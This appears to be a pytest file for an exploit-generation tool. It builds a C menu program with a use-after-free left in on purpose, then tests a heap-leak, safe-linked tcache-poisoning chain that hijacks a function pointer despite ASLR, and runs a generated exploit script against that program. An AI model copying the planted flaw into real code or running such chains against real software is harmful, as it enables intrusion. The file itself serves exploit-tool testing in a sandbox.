"""Leak-consuming safe-linked tcache poison -> control hijack (doc 58).

`_tcache_chain` bakes in a ptrace-TRACED chunk address, so its mangle is only valid under the
sandbox's ASLR-off determinism -- the PoC dies on a live ASLR target. `_heap_leak_chain` /
`_heap_leak_run` recover the heap key from an in-band use-after-free leak IN THE SAME PROCESS and
forge the safe-linking fd at run time, so the exploit survives heap ASLR.

These build a non-PIE menu fixture with a use-after-free view (leaks a freed tcache chunk's fd)
and a use-after-free edit (plants the poisoned fd), then drive the real lowering with ASLR ON and
confirm control reaches win -- with the keys varying run to run (the defeat is genuine) and a
negative control that must NOT win. Also runs the SHIPPED reproducer script (the bundle artifact)
against the fixture. Building a fixture in dev/benchmark is allowed (the air-gap constraint is on
the shipped tool). Needs glibc >= 2.32 for safe-linking to be the technique under test.
"""
import shutil
import struct
import subprocess
import sys

import pytest

from lykos.analyze.poc import chain_primitive, heap_groom
from lykos.analyze.poc.heap import demangle, mangle

_p64 = lambda v: struct.pack("<Q", v)

# A non-PIE number menu: 1 alloc(size) · 2 free(idx) [no clear -> UAF] · 3 view(idx) writes the
# chunk's raw bytes (a freed chunk discloses its safe-linked fd) · 4 edit(idx,len)+raw bytes
# [UAF write] · 5 use -> calls the global handler. Unknown/blank lines are ignored (a tolerant
# loop, as real menus are), so a size read's trailing newline never ends the session.
_FIXTURE = r"""
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
void win(void){ puts("pwned{tcache-safelink-leak}"); fflush(stdout); _exit(0); }
void defh(void){ }
void (*g_handler)(void) __attribute__((aligned(16))) = defh;
void *slots[64]; int nslot = 0;
static long rdl(void){ char b[64]; if (!fgets(b, sizeof b, stdin)) exit(0); return strtol(b, 0, 10); }
int main(void){
    char cmd[64];
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);
    while (fgets(cmd, sizeof cmd, stdin)) {
        long c = strtol(cmd, 0, 10);
        if (c == 1) { long sz = rdl(); slots[nslot++] = malloc(sz); }
        else if (c == 2) { long i = rdl(); free(slots[i]); }               /* UAF: no clear */
        else if (c == 3) { long i = rdl(); write(1, slots[i], 16); putchar('\n'); }
        else if (c == 4) { long i = rdl(); long n = rdl(); if (read(0, slots[i], n) < 0) return 1; }
        else if (c == 5) { g_handler(); }
        /* else: ignore -- tolerant loop */
    }
    return 0;
}
"""

_ROLES = {"add": "1", "free": "2", "view": "3", "edit": "4", "edit_fields": ["idx", "num", "str"]}
_MODEL = {"1": ["num"], "2": ["idx"], "3": ["idx"], "4": ["idx", "num", "str"]}


def _sym(exe, name):
    for ln in subprocess.check_output(["nm", str(exe)], text=True).splitlines():
        p = ln.split()
        if len(p) == 3 and p[2] == name:
            return int(p[0], 16)
    raise AssertionError(f"{name} not found")


def _build(tmp_path):
    src = tmp_path / "menu.c"
    src.write_text(_FIXTURE)
    exe = tmp_path / "menu"
    r = subprocess.run(["gcc", "-no-pie", "-fno-stack-protector", "-O0", "-o", str(exe), str(src)],
                       capture_output=True, text=True)
    if r.returncode != 0:
        pytest.skip(f"fixture build failed: {r.stderr[:200]}")
    exe.chmod(0o755)
    return exe


def _plain_spawn(exe):
    return lambda: subprocess.Popen([str(exe)], stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                                    stderr=subprocess.STDOUT)


def test_forge_safelink_fd_roundtrips_through_glibc_mangle():
    # The leak from a lone freed chunk IS its page-shifted address (mangle(addr, NULL)); forging
    # key^target must demangle back to target at that same address -- the whole premise.
    addr, target = 0x55f1c2a3b000, 0x404070
    leaked = mangle(addr, 0)
    assert leaked == (addr >> 12)
    forged = heap_groom.forge_safelink_fd(leaked, target)
    assert demangle(addr, forged) == target


@pytest.mark.skipif(not shutil.which("gcc") or not shutil.which("nm"),
                    reason="needs gcc + nm to build the fixture")
def test_heap_leak_run_defeats_aslr(tmp_path):
    exe = _build(tmp_path)
    win, tgt = _sym(exe, "win"), _sym(exe, "g_handler")
    assert tgt % 16 == 0                                   # glibc 2.32+ rejects an unaligned chunk
    spawn = _plain_spawn(exe)

    keys = set()
    for _ in range(3):                                     # ASLR on by default -> keys must vary
        key, out = chain_primitive._heap_leak_run(spawn, None, _ROLES, "5", tgt, win, _MODEL,
                                                   safe=True, corrupt=False)
        assert key is not None, "the UAF view disclosed no recoverable heap key"
        assert b"pwned{tcache-safelink-leak}" in out, "control did not reach win"
        keys.add(key)
    assert len(keys) > 1, f"heap key did not vary across runs ({keys}) -- ASLR not exercised"

    # Negative control: the SAME chain with a corrupted fd must NOT win (so the positive result can
    # only be our forged pointer, not incidental flow) -- the 0-false-confirmation gate.
    _, neg = chain_primitive._heap_leak_run(spawn, None, _ROLES, "5", tgt, win, _MODEL,
                                            safe=True, corrupt=True)
    assert b"pwned{tcache-safelink-leak}" not in neg


@pytest.mark.skipif(not shutil.which("gcc") or not shutil.which("nm"),
                    reason="needs gcc + nm to build the fixture")
def test_shipped_repro_script_wins(tmp_path):
    # The bundle artifact is the reproducer SCRIPT (no static input can carry a runtime-leaked key).
    # Prove the exact script lykos files actually detonates the fixture.
    exe = _build(tmp_path)
    win, tgt = _sym(exe, "win"), _sym(exe, "g_handler")
    script = chain_primitive._heap_leak_repro_script(win, _ROLES, "5", tgt, True)
    sp = tmp_path / "exploit.py"
    sp.write_bytes(script)
    r = subprocess.run([sys.executable, str(sp), str(exe)], capture_output=True, timeout=30)
    assert b"pwned{tcache-safelink-leak}" in r.stdout, f"repro did not win: {r.stdout[-120:]!r}"
